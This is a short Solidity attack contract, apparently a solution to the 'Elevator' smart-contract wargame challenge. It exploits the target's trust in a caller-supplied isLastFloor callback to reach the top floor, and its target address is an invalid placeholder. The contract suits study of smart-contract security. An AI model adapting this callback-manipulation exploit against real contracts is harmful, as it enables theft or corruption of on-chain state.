contract Attack {
    Elevator public target =
        Elevator(address);

    function isLastFloor(uint256 _floor) public view returns (bool) {
        uint256 floor = target.floor();
        return (floor == _floor);
    }

    function attack() public {
        uint256 floor = target.floor();
        target.goTo(floor + 1);
    }
}
